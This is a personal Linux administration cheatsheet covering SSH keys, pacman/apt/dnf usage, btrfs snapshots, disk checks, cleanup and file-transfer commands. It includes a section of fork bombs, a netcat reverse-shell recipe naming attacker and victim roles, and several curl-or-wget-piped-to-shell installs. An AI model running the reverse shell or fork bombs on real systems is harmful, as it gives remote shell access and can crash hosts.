# [cheatsheet](./README.md)

- `Ctrl+Alt+Delete` to force systemd shutdown
- `Alt+PrtSc h` to print SysRq help to dmesg

## ssh

### [add git key](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent?platform=linux)

```shell
ssh-keygen -t ed25519 -C "example@gmail.com"
eval "$(ssh-agent -s)"
ssh-add ~/.ssh/id_ed25519
cat ~/.ssh/id_ed25519.pub
```

<https://github.com/settings/keys>

### generate and upload SSH

```shell
key_file=~/.ssh/filename
ssh-keygen -t ed25519 -f $key_file  # -P "password" -C "comment"
ssh-copy-id -i $key_file.pub user@host
# or mkdir -p ~/.ssh/ && editor ~/.ssh/authorized_keys
```

## package managers

### apt

```shell
# show installed https://askubuntu.com/q/2389
apt-mark showmanual
# or better
zgrep 'Commandline: apt' /var/log/apt/history.log /var/log/apt/history.log.*.gz
# or
zgrep -E "Commandline: apt(|-get)" /var/log/apt/history.log*
```

### pacman

#### Update old enough arch

```shell
sudo pacman --noconfirm --needed --color always -Sy archlinux-keyring
sudo pacman --noconfirm --needed --color always -Syu
# sudo pacman --needed --color always -Syu
```

#### tune parallel downloads

```shell
sudo sed -i 's/^#ParallelDownloads = [0-9]\+/ParallelDownloads = 7/' /etc/pacman.conf
```

##### revert

```shell
sudo sed -i 's/^ParallelDownloads = [0-9]\+/#ParallelDownloads = 7/' /etc/pacman.conf
```

#### AUR

```shell
sudo pacman --noconfirm --needed --color always -S git base-devel && git clone https://aur.archlinux.org/yay-bin.git && cd yay-bin && makepkg -si --noconfirm && cd - && rm -rf yay-bin
```

#### [mirrors choose](https://wiki.archlinux.org/title/mirrors#Fetching_and_ranking_a_live_mirror_list)

```shell
sudo yay -S --color always rate-mirrors-bin
export TMPFILE="$(mktemp)"; \
    sudo true; \
    rate-mirrors --save=$TMPFILE arch --max-delay=43200 \
      && sudo mv /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist-backup \
      && sudo mv $TMPFILE /etc/pacman.d/mirrorlist
```

### dnf

#### clean

```shell
sudo dnf clean all
```

### rust

#### rustup

##### TODO

- [profile](https://rust-lang.github.io/rustup/concepts/profiles.html)
  - minimal?
- PATH

```shell
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
# or proto install rust
```

#### software

```shell
cargo install cargo-update
cargo install-update -a
```

## btrfs

```shell
sudo btrfs fi usage /

sudo btrfs balance start --full-balance --bg /
sudo btrfs balance status /

sudo btrfs scrub start /
sudo btrfs scrub status /

sudo mkdir -p /btrfs_tmp && sudo mount /dev/disk/by-uuid/afb30336-18f3-4359-bebb-39c51e8f7b45 /btrfs_tmp
BACKUP_DATE=$(date +%Y-%m-%d)
sudo btrfs subvolume snapshot -r /btrfs_tmp/@persistent "/btrfs_tmp/@persistent-backup-$BACKUP_DATE"
sudo btrfs send "/btrfs_tmp/@persistent-backup-$BACKUP_DATE" | zstd | pv | ssh admin "cat > /tank/storage/backups/@persistent-backup-$BACKUP_DATE.btrfs.zst"
```

## distrobox

```shell
# astra linux
distrobox create --name astra --image registry.astralinux.ru/astra/ubi18:latest
```

## partitions

- `sudo cfdisk /dev/...`
  - `sudo parted`
- `nix shell nixpkgs#ntfs3g --command sudo ntfsfix /dev/nvme0n1p3`
  - `nix shell nixpkgs#ntfs3g --command sudo ntfsfix /dev/nvme0n1p3 --clear-dirty`

## commands

### [drop ram caches](https://linuxconfig.org/clear-cache-on-linux)

`sudo sysctl vm/drop_caches=3`

### [download "whole" site](https://pingvinus.ru/note/wget-download-sites) ([alt](https://superuser.com/q/1672776))

```shell
# set recursion depth manually
wget -r -k -l 7 -p -E -nc http://site.com/
# OR automatic
wget -mpEk http://site.com/
```

### check size of files at folder

```shell
# current folder
du . -hcd 1 | sort -hr
# current folder with files (use apparent sizes, rather than disk usage)
du . -hacd 1 --apparent-size | sort -hr
# all files in that folder recursively
du . -ha | sort -hr
```

### grep search in dir recursively

TODO add find or strings example

```shell
grep -rnw 'dir/' -e 'search'
```

### [dos2unix4folder](https://stackoverflow.com/a/11929475/15844518)

```shell
find . -type f -print0 | xargs -0 dos2unix -ic0 | xargs -0 dos2unix -b
# or for git repos
git ls-files | xargs dos2unix -ic0 | xargs dos2unix -b
```

### [bleachbit clear](https://askubuntu.com/q/671798)

```shell
sudo bleachbit --list | grep -E "[a-z0-9_\-]+\.[a-z0-9_\-]+" | grep -v system.free_disk_space | xargs sudo bleachbit --clean
```

### [clean running docker containers logs (also there is logs rotating config TODO)](https://stackoverflow.com/q/41091634)

```shell
sudo sh -c "truncate -s 0 /var/lib/docker/containers/*/*-json.log"
```

### [show motd](https://askubuntu.com/q/319528)

```shell
run-parts /etc/update-motd.d
```

### kill died terminals

unknown source

```shell
ps aux | grep sshd | grep "\w*@pts/.*" | awk {'print $2'} | xargs kill -9
```

### [cron based autoclean](https://crontab.guru/#0_0_*_*_*)

```shell
sudo crontab -e
# ---
0 0 * * * sh -c "truncate -s 0 /var/lib/docker/containers/*/*-json.log"
0 0 * * * bleachbit --list | grep -E "[a-z0-9_\-]+\.[a-z0-9_\-]+" | xargs bleachbit --clean
```

### linux fork bombs

```shell
# spams function calls
:(){ :|:& };:
# redirect yes output to "no" file
yes > no
```

### Ping whole subnet

```shell
subnet='192.168.1'; for i in {0..255}; do timeout 0.5 ping -c1 $subnet.$i; done
```

### send nc/netcat/croc etc

- use GNU or OpenBSD version of `nc` (not libressl)
- `nc` reverse shell
  - attacker listens `nc -vlp SERVER_PORT 2>&1 | tee -a console.log`
  - victim sends `nc SERVER_IP SERVER_PORT -e /bin/sh`
- [`nc` send file](https://superuser.com/a/98323)
  - `cat FILE_NAME | netcat SERVER_IP SERVER_PORT`
  - `nc -l -p SERVER_PORT -q 1 > FILE_NAME < /dev/null`
- [croc](https://github.com/schollz/croc)
  - `curl https://getcroc.schollz.com | bash`
    - alt with `wget -O- https://getcroc.schollz.com | bash`
    - if install is [failed](https://github.com/schollz/croc/issues/765), use unpacked binary from `/tmp/` folder (it is not deleted after failed install)

### test mounted disk speed

```shell
dd if=/dev/zero of=./disk-speed-test-$(date +%Y-%m-%d'_'%H_%M_%S).img bs=100M count=10 conv=fdatasync status=progress
```

### localepreview

```shell
localepreview () {
  locale -a | grep utf8 | while read locale; do
    printf "%20s: " $locale
    LC_ALL="$locale" date +%x\ %X\ %c
  done
}
```

### check file handlers and etc

```shell
command=<command to check>
strace --trace=file --string-limit=200 \
$(command) 2> ~/strace-$(date +%Y-%m-%d'_'%H_%M_%S).log

strace --trace=openat --attach <PID>

sudo fatrace . 2>&1 | grep <process or folder name>
```

### check file changes in folder

```shell
# modify,attrib,close_write,move,create,delete
inotifywait --event modify,create,delete,move --monitor --recursive ~/
```

### [remove empty directories](https://stackoverflow.com/a/72176404)

```shell
find . -type d -empty -delete
```
